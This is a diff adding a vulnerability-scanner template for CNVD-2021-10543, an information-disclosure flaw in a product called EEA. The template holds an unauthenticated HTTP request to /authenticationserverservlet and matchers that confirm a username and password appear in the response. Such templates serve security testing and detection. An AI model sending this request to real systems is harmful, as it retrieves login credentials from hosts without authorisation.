@@ -1,0 +1,24 @@
+## id: CNVD-2021-10543
+## name: EEA - Information Disclosure
+## author: hack007x
+## severity: high
+## tags: cnvd,cnvd2021,config,exposure,vuln
+## description: EEA is susceptible to information disclosure including the username and password.
+## cvss-score: 7.5
+## reference: https://www.cnvd.org.cn/flaw/show/CNVD-2021-10543
+## verification: true
+
+GET /authenticationserverservlet HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body matches /<username>(.*?)<\/username>/
+#@ matcher: body matches /<password>(.*?)<\/password>/
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: abbc721249d6777e0df0f1e87abc657ce6fd1ee76eb664a845db6917898f3aa2
